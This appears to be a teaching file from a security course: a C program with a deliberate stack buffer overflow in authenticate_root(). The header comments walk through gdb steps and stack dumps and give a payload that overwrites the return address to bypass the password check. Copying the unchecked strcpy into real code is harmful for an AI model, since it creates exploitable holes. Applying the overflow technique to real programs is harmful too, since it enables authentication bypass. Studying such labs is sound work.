/*
 * Control-flow Attack
 * (c) Elias Athanasopoulos,  athanasopoulos.elias@ucy.ac.cy
 *
 * Compile the attached C program.
 * $ gcc -Wall -no-pie -fno-pic -m32 -fno-stack-protector stack-smash0.c -o stack-smash0
 *
 * Run the program with gdb.
 * $ gdb ./stack-smash0
 *
 * Add a breakpoint inside authenticate_root() and after the strcpy() call:
 *    0x080484e1 <+22>:	push   %eax
 *    0x080484e2 <+23>:	call   0x8048380 <strcpy@plt>
 * => 0x080484e7 <+28>:	add    $0x10,%esp
 *    0x080484ea <+31>:	mov    0x804a028,%eax
 *    0x080484ef <+36>:	sub    $0x4,%esp
 *
 * (gdb) b *0x080484e7
 * 
 * Run the program inside gdb:
 * (gdb) r `printf "AAAAAAAAAA"`
 * 
 * Observe the stack (spot the marker (m), ebp (ebp), and return address (ret)):
 * Starting program: /home/elathan/ucy/epl326/8/stack-smash `printf "AAAAAAAAAA"`
 * 
 * Breakpoint 2, 0x080484e7 in authenticate_root ()
 * (gdb) x/32x $ebp-32
 * 0xffffd298:	0xf7e0de18	0x41414141	0x41414141	0xff004141
 * 0xffffd2a8:	0xf7ffcd00	0xdeadbeef(m)	0x00000000	0xffffd384
 * 0xffffd2b8:	0xffffd2d8(ebp) 0x08048565(ret)	0xffffd52f	0xffffd384
 * 0xffffd2c8:	0xffffd390	0x080485c1	0xf7fb53dc	0xffffd2f0
 * 0xffffd2d8:	0x00000000	0xf7e19276	0x00000002	0xf7fb5000
 * 0xffffd2e8:	0x00000000	0xf7e19276	0x00000002	0xffffd384
 * 0xffffd2f8:	0xffffd390	0x00000000	0x00000000	0x00000000
 * 0xffffd308:	0xf7fb5000	0xf7ffdc04	0xf7ffd000	0x00000000
 * 
 * Continue, by adding more 'A's and by patching the return address to point after
 * the conditional check in main():
 * 
 *    0x0804856f <+46>:	je     0x8048583 <main+66>
 *    0x08048571 <+48>:	sub    $0xc,%esp
 * => 0x08048574 <+51>:	push   $0x804864e
 *    0x08048579 <+56>:	call   0x8048390 <puts@plt>
 *
 * A possible successful payload (should be adjusted):
 *  
 * "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x57\x85\x04\x08" 
 */










#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int password_valid = 0;

void authenticate_root(char *passwd) {
	unsigned long marker = 0xdeadbeef;
	char password[16];

	strcpy(password, passwd);

	fprintf(stderr, "%p\n", &marker);
	fprintf(stderr, "Validating password: %s\n", password);

	if (!strcmp(password, "e5ce4db216329f4f")) 
		password_valid = marker;

}

int main(int argc, char *argv[]) {

	authenticate_root(argv[1]);

	if (password_valid != 0) {
		printf("Welcome administrator.\n");
	} else {
		printf("Access denied.\n");
	}

	return 1;
}